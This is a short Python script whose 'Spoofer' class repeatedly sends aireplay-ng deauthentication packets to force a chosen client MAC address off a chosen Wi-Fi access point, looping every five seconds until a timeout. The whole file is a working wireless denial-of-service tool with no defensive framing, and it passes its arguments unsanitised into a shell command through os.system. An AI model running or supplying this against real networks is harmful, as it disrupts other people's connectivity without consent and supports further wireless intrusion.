#!/usr/bin/python3

import os
import time


class Spoofer:
    def disassociate(self, mac_address, ap_mac_address):
        os.system("aireplay-ng -0 1 -a " + ap_mac_address + " -c " + mac_address + " eth0")

    def __init__(self, mac_address, ap_mac_address, timeOutInMinutes):
        timeOut = time.time() + timeOutInMinutes * 60
        while time.time() < timeOut:
            self.disassociate(mac_address, ap_mac_address)
            time.sleep(5)
